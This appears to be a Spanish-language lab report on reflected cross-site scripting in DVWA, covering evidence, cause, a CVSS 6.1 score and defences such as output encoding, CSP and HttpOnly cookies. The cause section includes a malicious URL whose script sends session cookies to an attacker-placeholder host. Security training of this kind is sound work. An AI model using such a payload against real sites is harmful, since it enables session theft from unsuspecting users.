# XSS Reflected (Cross-Site Scripting)

## 1. Evidencia

**Módulo DVWA:** XSS (Reflected)  
**Nivel de seguridad:** Low  
**Payload utilizado:** `<script>alert('Johnen')</script>`  
**Captura:**

![Evidencia XSS Reflected](../img_johnic/xss_johnic.png)

**Descripción:** Al ingresar el payload en el campo "What's your name?", la aplicación reflejó el script directamente en el HTML de la respuesta sin sanitización alguna, ejecutando el código JavaScript en el navegador de la víctima. El resultado fue una ventana de alerta con el texto "johnen", confirmando la ejecución arbitraria de código.

---

## 2. ¿Por qué ocurre?

La vulnerabilidad existe porque la aplicación toma el input del usuario y lo inserta directamente en el HTML de la respuesta sin escapar los caracteres especiales. El navegador interpreta el contenido como código HTML/JavaScript válido y lo ejecuta. En un escenario real, un atacante podría distribuir una URL maliciosa como:
## https://portal.notaria.cl/xss_r?name=<script>document.location='https://atacante.com/steal?c='+document.cookie</script>
Logrando robar cookies de sesión, redirigir al usuario a sitios falsos o capturar credenciales.

---

## 3. CVSS v3.1

**Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`  
**Puntaje Base:** 6.1 — **Medio**

| Métrica                    | Valor                  |
|----------------------------|------------------------|
| Vector de Ataque           | Red (Network)          |
| Complejidad del Ataque     | Baja (Low)             |
| Privilegios Requeridos     | Ninguno (None)         |
| Interacción del Usuario    | Requerida (Required)   |
| Alcance                    | Cambia (Changed)       |
| Confidencialidad           | Bajo (Low)             |
| Integridad                 | Bajo (Low)             |
| Disponibilidad             | Ninguna (None)         |

---

## 4. Defensa

- **Escapado de output (Output Encoding):** Convertir caracteres especiales como `<`, `>`, `"` y `'` en sus entidades HTML equivalentes antes de insertarlos en la respuesta.
- **Content Security Policy (CSP):** Configurar cabeceras HTTP que restrinjan qué scripts pueden ejecutarse en el navegador, bloqueando scripts inline no autorizados.
- **Validación de inputs:** Rechazar o sanitizar entradas que contengan etiquetas HTML o atributos de eventos como `onerror`, `onload` o `onclick`.
- **HttpOnly y Secure en cookies:** Marcar las cookies de sesión con el atributo `HttpOnly` para impedir su acceso desde JavaScript, reduciendo el impacto de un XSS exitoso.
- **Frameworks con escapado automático:** Utilizar motores de plantillas como React, Angular o Vue que escapen el contenido por defecto al renderizar variables.